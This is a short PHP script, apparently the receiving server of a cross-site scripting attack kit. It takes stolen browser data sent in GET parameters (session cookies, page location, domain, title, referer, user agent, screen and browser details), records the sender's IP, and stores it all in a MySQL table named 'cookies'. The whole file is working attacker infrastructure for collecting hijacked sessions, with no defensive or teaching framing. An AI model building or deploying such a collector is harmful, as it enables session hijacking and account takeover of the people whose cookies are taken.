<?php
@header("Content-Type:text/html;charset=utf-8");
@require('mysql.class.php');

function get_real_ip(){
    // 获取真实IP
    $ip=false;
    if(!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
        if ($ip) {
            array_unshift($ips, $ip); $ip = FALSE;
        }
        for ($i = 0; $i < count($ips); $i++) {
            if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
                $ip = $ips[$i];
                break;
            }
        }
    }
    return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}

function get_user_agent(){
    // 获取请求包的User-Agent
    return $_SERVER['HTTP_USER_AGENT'];
}

function get_referer(){
    // 获取请求包的Referer
    return $_SERVER['HTTP_REFERER'];
}

$date       = time();
$ip         = htmlspecialchars(get_real_ip());
$screen     = htmlspecialchars($_GET['screen']);
$browser    = htmlspecialchars($_GET['browser']);
$flash      = htmlspecialchars($_GET['flash']);
$ua         = htmlspecialchars($_GET['ua']);
$domain     = htmlspecialchars($_GET['domain']);
$title      = htmlspecialchars($_GET['title']);
$lang       = htmlspecialchars($_GET['lang']);
$referer    = htmlspecialchars($_GET['referer']);
$location   = htmlspecialchars($_GET['location']);
$toplocation= htmlspecialchars($_GET['toplocation']);
$cookie     = htmlspecialchars($_GET['cookie']);

$db = new mysql();
$arr = array();
$arr['date'] = $date;
$arr['ip'] = $ip;
$arr['screen'] = $screen;
$arr['browser'] = $browser;
$arr['flash'] = $flash;
$arr['useragent'] = $ua;
$arr['domain'] = $domain;
$arr['title'] = $title;
$arr['lang'] = $lang;
$arr['referer'] = $referer;
$arr['location'] = $location;
$arr['toplocation'] = $toplocation;
$arr['cookie'] = $cookie;
$db->insert('cookies',$arr);

?>
